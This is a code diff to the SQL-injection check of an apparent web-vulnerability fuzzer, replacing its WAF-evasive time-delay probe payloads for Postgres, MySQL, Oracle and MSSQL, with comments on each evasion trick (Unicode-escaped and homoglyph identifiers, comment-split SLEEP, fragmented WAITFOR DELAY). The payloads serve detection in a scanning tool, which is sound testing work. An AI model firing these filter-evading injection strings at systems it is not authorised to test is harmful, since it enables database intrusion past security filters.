@@ -43,23 +43,27 @@ class sqli(BaseLightfuzz):
         "string not properly terminated",
     ]
 
-    # WAF-evasive time-delay payloads, with each original injection context retained:
-    #   * Postgres uses pg_sleep_for(interval); IS NULL forces evaluation instead of
-    #     allowing the planner to discard the function from an EXISTS target list.
-    #   * MySQL accepts a # comment between SLEEP and its arguments. Bitwise XOR
-    #     forces function evaluation instead of allowing boolean short-circuiting.
-    #   * Oracle folds the Unicode identifier characters below to DBMS_PIPE and
-    #     RECEIVE_MESSAGE while preserving the blocking function call.
-    #   * MSSQL assembles WAITFOR DELAY from string constants passed to EXECUTE.
+    # WAF-evasive time-delay payloads retain the default payloads' injection
+    # contexts while changing as little syntax as possible:
+    #   * Postgres uses a Unicode-escaped identifier for pg_sleep.
+    #   * MySQL accepts a # comment between SLEEP and its arguments; the
+    #     numeric form adds an empty string so it has the quoted token shape.
+    #   * Oracle folds the Unicode identifiers below to DBMS_PIPE and
+    #     RECEIVE_MESSAGE. The application schema needs EXECUTE on DBMS_PIPE.
+    #   * MSSQL assembles WAITFOR DELAY with compact string fragments. Keep the
+    #     plain WAITFOR forms as fallbacks because some request paths reject
+    #     dynamic batches even when stacked statements work.
     DELAY_PROBE_TEMPLATES = [
-        "'||pg_sleep_for('{d} seconds'::interval)--",
-        "'OR(pg_sleep_for('{d} seconds'::interval)IS NULL)--",
+        '\'||U&"pg\\005fsleep"({d})--',
+        '\'OR(U&"pg\\005fsleep"({d})IS NULL)--',
         "1'^SLEEP#q\n({d})^'0",
         "'^SLEEP#q\n({d})^'0",
-        "^SLEEP#q\n({d})#",
+        "^''^SLEEP#q\n({d})#",
         "'||DBMſ_PıPE.RECEıVE_MEſſAGE('a',{d})||'",
-        "';EXECUTE--q\n('W'+'A'+'I'+'T'+'F'+'O'+'R'+' '+'D'+'E'+'L'+'A'+'Y'+' '+'''00:00:{d:02d}''')--",
-        ";EXECUTE--q\n('W'+'A'+'I'+'T'+'F'+'O'+'R'+' '+'D'+'E'+'L'+'A'+'Y'+' '+'''00:00:{d:02d}''')--",
+        "';EXECUTE('W'+'AITFOR D'+'ELAY ''00:00:{d:02d}''')--",
+        "'; WAITFOR DELAY '00:00:{d:02d}'--",
+        ";EXECUTE('W'+'AITFOR D'+'ELAY ''00:00:{d:02d}''')--",
+        "; WAITFOR DELAY '00:00:{d:02d}'--",
     ]
 
     def _delay_probe_value(self, event_type, value):
@@ -326,6 +330,7 @@ class sqli(BaseLightfuzz):
                             ),
                         }
                     )
+                    return
                 else:
                     self.verbose(
                         f"Stage 2 rejected {self.event.url}: d_high={d_high:.2f}s, "
